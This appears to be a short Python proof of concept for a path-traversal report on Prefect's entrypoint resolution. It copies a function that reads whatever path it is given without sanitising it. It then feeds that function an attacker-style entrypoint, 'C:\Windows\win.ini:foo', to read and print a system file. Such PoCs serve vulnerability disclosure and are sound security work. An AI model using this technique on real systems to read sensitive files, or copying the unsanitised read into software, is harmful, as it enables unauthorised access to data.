"""
PoC: HIGH - Path Traversal in Entrypoint Resolution
Location: src/prefect/flows.py:3610
Function: _entrypoint_definition_and_source
"""
from pathlib import Path


def _entrypoint_definition_and_source(entrypoint: str):
    """Vulnerable function from src/prefect/flows.py:3588"""
    if ":" in entrypoint:
        path, object_path = entrypoint.rsplit(":", maxsplit=1)
        # NO PATH SANITIZATION - directly reads user-controlled path
        source_code = Path(path).read_text()
    else:
        import importlib.util
        path, object_path = entrypoint.rsplit(".", maxsplit=1)
        spec = importlib.util.find_spec(path)
        if not spec or not spec.origin:
            raise ValueError(f"Could not find module {path!r}")
        source_code = Path(spec.origin).read_text()
    return source_code


if __name__ == "__main__":
    # Attacker-controlled entrypoint string
    malicious_entrypoint = "C:\\Windows\\win.ini:foo"
    print(f"[*] Attempting to read file via: {malicious_entrypoint}")
    try:
        content = _entrypoint_definition_and_source(malicious_entrypoint)
        print(f"[*] SUCCESS! Read {len(content)} bytes:")
        print(content[:200])
    except Exception as e:
        print(f"[*] Failed: {e}")
